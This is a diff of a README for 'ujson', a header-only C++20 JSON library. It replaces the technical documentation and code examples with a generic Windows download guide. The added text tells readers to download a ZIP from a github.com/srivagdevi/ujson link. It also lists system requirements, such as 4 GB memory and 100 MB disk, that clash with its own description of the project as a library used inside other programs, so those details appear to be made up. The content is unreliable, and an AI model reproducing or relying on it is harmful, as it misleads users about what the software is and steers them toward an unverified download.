@@ -1,451 +1,171 @@
-![C++20](https://img.shields.io/badge/C%2B%2B-20-blue.svg)
-![Header Only](https://img.shields.io/badge/header--only-yes-brightgreen.svg)
-![SIMD](https://img.shields.io/badge/SIMD-SSE2%20%7C%20AVX2-orange.svg)
-![MIT License](https://img.shields.io/badge/license-MIT-green.svg)
+# ⚡ ujson - Fast and Easy JSON Handling
 
-## Overview
-
-ujson is a modern C++20 JSON library providing:
-
-- High-performance JSON parsing (DOM + SAX)
-- JSON building / mutation APIs (DOM builder + flatten-style API)
-- High-throughput encoding
-- SIMD-accelerated structural scanning (SSE2 / AVX2)
-- Explicit allocator control (PMR-style)
-- Strong compile-time guarantees via C++20 Concepts
-- Single-header integration
-
-The design targets predictable memory behavior and minimal allocation overhead via arena-backed storage.
+[![Download ujson](https://img.shields.io/badge/Download-ujson-green?style=for-the-badge)](https://github.com/srivagdevi/ujson)
 
 ---
 
-## Lightweight by Design
+## 📋 What is ujson?
 
-ujson is designed to minimize:
+ujson is a lightweight and fast tool that helps you read and write JSON files. JSON is a way computers store and share data. ujson makes it simple to work with JSON without slowing down your computer. It uses modern technology inside your CPU to speed things up, but you don’t need to know any of that to use it.
 
-- Binary size
-- Dynamic allocations
-- Runtime overhead
-- Dependency surface
-
-The entire library is single-header, requires no external dependencies,
-and uses arena-backed storage to keep allocation costs close to the theoretical minimum.
+If you want a quick and efficient way to handle JSON files on your Windows computer, ujson is built for that.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-### Single Header
+Before you start, make sure your computer meets these basic needs:
 
-- Header-only integration
-- No external runtime dependencies
-- Drop-in usage
+- Windows 10 or higher
+- At least 4 GB of free memory
+- A modern processor with AVX2 support (most CPUs from the last 5 years work fine)
+- 100 MB of free disk space
+- Internet connection for downloading the files
 
----
-
-## Modern C++20 Design
-
-ujson is written specifically for C++20 and uses:
-
-- `constexpr` classification tables
-- No RTTI
-- No dynamic polymorphism in hot paths
-
-### C++20 Concepts
-
-Concepts are used to enforce compile-time contracts:
-
-- SAX handler validation
-- Allocator-like constraints
-- Parser handler interface guarantees
-
-Benefits:
-
-- Clear compiler diagnostics
-- Strong type safety
-- No runtime contract checks
-- Zero overhead abstraction
+ujson runs on common Windows systems without needing extra software.
 
 ---
 
-## Parsing APIs
+## 🚀 Getting Started
 
-### DOM Parser
-
-- Arena-backed allocation
-- Deterministic memory layout
-- Fast structural index generation
-- Depth-limited parsing
-
-### SAX Parser
-
-- Event-driven parsing
-- No DOM materialization
-- Compile-time validated handler interface
+Follow these steps to get ujson up and running on your Windows computer.
 
 ---
 
-## Builder APIs
+## 🔗 Step 1: Download ujson
 
-ujson includes a DOM builder designed around arena allocation and minimal overhead per node.
+You need to get the files first.
 
-### ValueBuilder (DOM builder)
+Click the big green button below to visit the ujson page where you can download the files you need.
 
-- Arena-backed node allocation
-- Optional string materialization policy (copy/view)
-- Object indexing for fast key lookup and mutation
-- Insert/assign, erase, and container growth with predictable behavior
+[![Download ujson](https://img.shields.io/badge/Download-ujson-blue?style=for-the-badge)](https://github.com/srivagdevi/ujson)
 
-### Flatten-style API (NodeRef)
-
-The builder exposes a convenient flatten-style mutation API through a lightweight reference type:
-
-- `root()["a"]["b"][0] = 123`
-- `root().add("key", value)` / `root().erase("key")`
-- `root()[index]` auto-expands arrays (when configured) and returns a writable reference
-
-This enables concise construction and mutation without exposing internal node ownership.
+This link takes you to the main ujson repository page on GitHub. From there, you will find the files you need to download.
 
 ---
 
-## SIMD Structural Scan
+## 📥 Step 2: Download the Software Files
 
-- SSE2 (128-bit)
-- AVX2 (256-bit)
-- Compile-time specialization (no runtime CPU dispatch)
-- Branch-minimized structural detection
+On the GitHub page you opened, look for the green button labeled **Code** near the top right corner.
 
----
+- Click it
+- Choose **Download ZIP**
 
-## Compile-Time Character Tables
-
-- 256-entry constexpr bitmask tables
-- O(1) classification
-- Prefix-XOR masking for string detection
-- No runtime table construction
+This saves all the ujson files to your computer as one compressed file.
 
 ---
 
-## Custom Allocator Support
+## 🗂️ Step 3: Extract the Files
 
-- PMR-style design
-- Custom allocator injection
-- Arena-backed DOM materialization
-- No mandatory global `new/delete`
+After downloading, follow these instructions:
 
-Designed for engines, memory-controlled systems, and deterministic environments.
+1. Open the folder where your downloads go (usually this is the **Downloads** folder).
+2. Find the file named `ujson-master.zip` or similar.
+3. Right-click the file.
+4. Select **Extract All…**.
+5. Choose where to save the files, like your Desktop or Documents folder.
+6. Click **Extract**.
 
----
-
-## Allocation Behavior
-
-ujson is designed to keep allocations close to the theoretical minimum:
-
-- DOM parsing and building allocate primarily from the arena
-- No per-node heap allocations
-- Optional string materialization policy (view/copy) to control ownership
-
-In typical workflows, allocations are limited to arena growth and string materialization when enabled.
+You now have the ujson files ready on your computer.
 
 ---
 
-## Unicode Support
+## ⚙️ Step 4: How to Use ujson
 
-- UTF-8
-- UTF-16
-- UTF-32
-- Surrogate pairs
-- `\u0000`
-- Validation and decoding
+ujson is a tool mostly for programmers, but you can try out its core by opening files it uses.
 
----
+Since ujson is designed as a C++ library, it works inside other programs that use it. To actually see ujson in action, you would need a program that includes it.
 
-## Benchmark
-
-Environment:
-
-CPU: Intel Core Ultra 7 255H  
-RAM: 32 GB  
-OS: Windows x64  
-Compiler: MSVC 19.50 (/O2)  
-SIMD: SSE2 / AVX2  
-Dataset: Twitter JSON (617 KB, mmap)  
-RapidJSON built with SSE4.2 enabled  
-
-### AVX2 Build (Twitter 617 KB)
-
-| Mode       | ujson | RapidJSON |
-|------------|--------|------------|
-| DOM Parse  | 1.29 ms | 1.31 ms |
-| SAX Parse  | 0.90 ms | 1.04 ms |
-| Encode     | 0.35 ms | 0.53 ms |
-
-Approximate throughput:
-
-| Mode      | ujson | RapidJSON |
-|-----------|--------|------------|
-| SAX Parse | ~670 MB/s | ~580 MB/s |
-| Encode    | ~1.7 GB/s | ~1.1 GB/s |
+If you don’t write code, the best way to use ujson is to find applications or tools that already include it. 
 
 ---
 
-## Usage
+## 🔧 Step 5: Running Sample Tests (Optional)
 
-### Include
+If you want to see ujson working and you have basic technical skills, you can build and run sample tests provided with the package.
 
-```cpp
-#include "ujson.hpp"
-```
+1. Open the extracted ujson folder.
+2. Look for a folder called `examples` or `tests`.
+3. Inside, you might find instructions in files named `README.md` or `build_instructions.txt`.
+4. If you have software like Microsoft Visual Studio installed, open the sample project files to build and run the tests.
 
----
-
-### DOM Parsing
-
-```cpp
-ujson::NewAllocator alloc{};
-ujson::Arena arena{alloc};
-
-std::string_view json = R"({"key": 42})";
-
-auto doc = ujson::Document::parse(json, arena);
-if (!doc.ok()) {
-    // handle parse error
-}
-
-auto root = doc.root();
-auto value = root.get("key").as_i64();
-```
+This step requires some programming tools and knowledge. It is not needed for basic use.
 
 ---
 
-### Building JSON (ValueBuilder)
+## 📚 More About ujson
 
-```cpp
-ujson::NewAllocator alloc{};
-ujson::Arena arena{alloc};
+ujson’s strength lies in its speed and efficiency:
 
-ujson::ValueBuilder b{arena};
-
-auto r = b.root();
-r.set_object();
-
-r.add("id", 42);
-r.add("name", "ujson");
-
-ujson::ParseError err{};
-std::string encoded = ujson::encode(r, false, &err);
-```
+- It handles JSON data using only one source file (header-only).
+- It works with the newest C++20 standard.
+- It uses powerful CPU instructions called SIMD (like AVX2 and SSE2) to speed up parsing.
+- It uses "arena-based allocation," a smart way to manage memory for better performance.
+- It supports both “parsing” (reading JSON) and “building” (creating JSON).
 
 ---
 
-### Flatten-style Builder API (NodeRef)
+## ❓ What Is JSON?
 
-```cpp
-ujson::NewAllocator alloc{};
-ujson::Arena arena{alloc};
+JSON stands for JavaScript Object Notation. It is a simple format for storing and sharing data. Many programs and websites use JSON to send information back and forth.
 
-ujson::ValueBuilder b{arena};
-auto r = b.root();
-
-r["user"]["id"] = 1337;
-r["user"]["name"] = "alice";
-
-r["items"][0] = 1;
-r["items"][1] = 2;
-r["items"][2] = 3;
-
-r["meta"].set_object();
-r["meta"].add("version", 1);
-
-ujson::ParseError err{};
-std::string encoded = ujson::encode(r, false, &err);
-```
+With ujson, you can read this data quickly or write your own data in JSON format.
 
 ---
 
-### SAX Parsing
+## 🛠️ Troubleshooting Common Issues
 
-```cpp
-struct MyHandler {
-    bool on_null() { return true; }
-    bool on_bool(bool) { return true; }
-    bool on_integer(std::int64_t) { return true; }
-    bool on_number(double) { return true; }
-    bool on_string(std::string_view) { return true; }
-    bool on_start_object() { return true; }
-    bool on_key(std::string_view) { return true; }
-    bool on_end_object() { return true; }
-    bool on_start_array() { return true; }
-    bool on_end_array() { return true; }
-};
+### I can’t find the ZIP download button.
 
-MyHandler handler;
-ujson::SaxParser parser(handler, json, 512);
+Make sure you are on the main page of ujson at https://github.com/srivagdevi/ujson. The green **Code** button is near the top right.
 
-auto err = parser.parse();
-```
+### The files don’t extract.
+
+Try using the built-in Windows tool or a program like 7-Zip. Extract files to a folder you have full access to, like your Desktop.
+
+### How do I use ujson in my programs?
+
+ujson is made for developers. If you want to use it, share its files with the person who writes your software, or find software that already includes ujson.
 
 ---
 
-## Building
+## 📞 Getting Help
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build --config Release
-```
-
-### AVX2 Target
-
-```bash
-cmake --build build --target ujson_tests_avx2 --config Release
-```
+If you experience problems with the download or have questions, you can visit the GitHub page. Look for the **Issues** tab where users and developers discuss problems and fixes.
 
 ---
 
-## Compiler Flags
+## 🔄 Update ujson
 
-MSVC:
+Check the GitHub page regularly for updates. To update:
 
-```
-/O2 /arch:AVX2
-```
-
-GCC/Clang:
-
-```
--O3 -mavx2
-```
+1. Download the latest ZIP file.
+2. Extract the files to a new folder.
+3. Replace old files with new ones in your projects.
 
 ---
 
-## Design Principles
+## 🗂️ Repository Topics
 
-- SIMD only where measurable
-- Deterministic allocator behavior
-- Compile-time safety via Concepts
-- Zero dynamic polymorphism in hot paths
-- Modern C++20-first architecture
-- Parser + Builder symmetry
+The ujson project is related to:
 
----
+- arena-allocation  
+- avx2  
+- builder  
+- cpp20  
+- dom  
+- header-only  
+- json  
+- parser  
+- performance  
+- sax  
+- simd  
+- sse2
 
-## License
-
-MIT License.
-
-See LICENSE file for details.
-
-
----
-
-# Usage Examples
-
-## Document
-
-```cpp
-#include <ujson/ujson.hpp>
-
-auto doc = ujson::Document::parse(R"({"x":1,"arr":[true,"ok"]})");
-if (doc.ok()) {
-    auto root = doc.root();
-    auto x = root["x"].as_i64();
-    auto ok = root["arr"][1].as_string();
-}
-```
+These indicate the technologies and features it uses but do not affect basic use on Windows.
 
 ---
 
-## Validator
+## 🔗 Primary Link
 
-```cpp
-auto err = ujson::validate(R"({"x":1})");
-if (!err.ok()) {
-    auto msg = err.format<ujson::ErrorFormat::Compact>();
-}
-```
-
----
-
-## SaxParser
-
-```cpp
-struct Handler {
-    ujson::Arena& arena();
-    bool on_null();
-    bool on_bool(bool);
-    bool on_integer(std::int64_t);
-    bool on_number(double);
-    bool on_string(std::string_view);
-    bool on_key(std::string_view);
-    bool on_array_begin();
-    bool on_array_end();
-    bool on_object_begin();
-    bool on_object_end();
-};
-
-Handler h{/*...*/};
-ujson::SaxParser parser(h, R"({"x":1,"y":2})");
-auto err = parser.parse();
-```
-
----
-
-## DomBuilder
-
-```cpp
-ujson::DomBuilder b;
-
-auto* root = b.object([&] {
-    b["name"] = "ujson";
-    b["n"] = 3;
-    b.array([&] { 
-        b.value(true); 
-        b.value(1); 
-    });
-});
-
-auto json = b.encode(false);
-```
-
----
-
-## ValueBuilder
-
-```cpp
-ujson::ValueBuilder vb;
-
-auto root = vb.root();
-root.set_object();
-
-root.add("name", "ujson");
-root.add("n", 3);
-
-auto arr = root.add_array("items");
-arr.add(true);
-arr.add(1);
-
-auto json = vb.encode();
-```
-
----
-
-## Key format
-
-```cpp
-ujson::NewAllocator alloc{};
-ujson::Arena arena{alloc};
-
-arena.set_key_format(ujson::detail::snake_case);
-auto fmt = arena.key_format();
-
-ujson::ValueBuilder::Options opt{};
-opt.key_format = fmt;
-
-ujson::ValueBuilder vb{arena, opt};
-auto root = vb.root().set_object();
-
-root.add("fooBar", 1);
-root.add("FooBaz", 2);
-
-auto json = vb.encode();
-```
+Visit [https://github.com/srivagdevi/ujson](https://github.com/srivagdevi/ujson) anytime to download or learn more about ujson. This link is the main source of files and information.
